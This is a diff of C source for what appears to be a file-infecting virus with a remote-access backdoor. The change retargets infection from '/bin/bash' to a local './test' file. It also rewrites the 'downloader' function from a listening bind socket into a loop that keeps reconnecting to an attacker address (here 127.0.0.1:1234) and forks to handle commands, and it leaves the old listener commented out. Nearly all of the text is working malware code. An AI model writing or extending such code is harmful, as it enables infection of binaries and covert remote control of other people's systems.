@@ -17,9 +17,10 @@
 
 #define opt 3
 
-#define infection_target "/bin/bash"
+#define infection_target "./test"
 
 #define port 1337
+#define addr "127.0.0.1"
 
 extern char** environ;
 
@@ -123,26 +124,50 @@ void process_connection(int connection_fd){
 }
 
 void downloader(){
-  int socket_fd, connection_fd, addr_len; 
-  struct sockaddr_in server_addr, client; 
+  int socket_fd;
+  int connection_fd = -1;
+  int pid;
+  struct sockaddr_in server;  
+  
   socket_fd = socket(AF_INET, SOCK_STREAM, 0);
-  memset(&server_addr, 0, sizeof(server_addr));
-  server_addr.sin_family = AF_INET; 
-  server_addr.sin_addr.s_addr = htonl(INADDR_ANY); 
-  server_addr.sin_port = htons(port);
-  bind(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr));
-  listen(socket_fd, 5);
-  addr_len = sizeof(client);
+  server.sin_family = AF_INET;
+  server.sin_port = htons(1234);
+  server.sin_addr.s_addr = inet_addr(addr);
+
   while(1){
-    connection_fd = accept(socket_fd, (struct sockaddr*)&client, &addr_len);
-    if(connection_fd > 0){
-      pid_t pid;
-      if((pid = fork()) == 0){
-	process_connection(connection_fd);
-      }else{
-	wait(NULL);
-	close(connection_fd);
-      }
+    while(connection_fd < 0){
+      sleep(5);
+      connection_fd = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
+    }
+    
+    if((pid = fork()) == 0){
+      process_connection(connection_fd);
+    }else{
+      wait(NULL);
+      close(connection_fd);
     }
   }
+  
+  /* int socket_fd, connection_fd, addr_len;  */
+  /* struct sockaddr_in server_addr, client;  */
+  /* socket_fd = socket(AF_INET, SOCK_STREAM, 0); */
+  /* memset(&server_addr, 0, sizeof(server_addr)); */
+  /* server_addr.sin_family = AF_INET;  */
+  /* server_addr.sin_addr.s_addr = htonl(INADDR_ANY);  */
+  /* server_addr.sin_port = htons(port); */
+  /* bind(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)); */
+  /* listen(socket_fd, 5); */
+  /* addr_len = sizeof(client); */
+  /* while(1){ */
+  /*   connection_fd = accept(socket_fd, (struct sockaddr*)&client, &addr_len); */
+  /*   if(connection_fd > 0){ */
+  /*     pid_t pid; */
+  /*     if((pid = fork()) == 0){ */
+  /* 	process_connection(connection_fd); */
+  /*     }else{ */
+  /* 	wait(NULL); */
+  /* 	close(connection_fd); */
+  /*     } */
+  /*   } */
+  /* } */
 }
